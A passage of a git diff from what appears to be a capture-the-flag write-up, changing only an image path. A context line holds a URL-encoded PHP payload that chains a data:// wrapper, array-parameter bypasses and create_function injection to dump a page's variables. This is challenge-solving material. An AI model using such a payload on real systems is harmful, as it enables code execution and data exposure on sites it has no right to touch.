@@ -176,7 +176,7 @@ eval(
 
 `%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%70%61%73%73%77%64[]=%31&%73%68%61%6e%61[]=%32&%66%6c%61%67[%63%6f%64%65]=create_function&%66%6c%61%67[%61%72%67]=}var_dump(get_defined_vars());//`
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
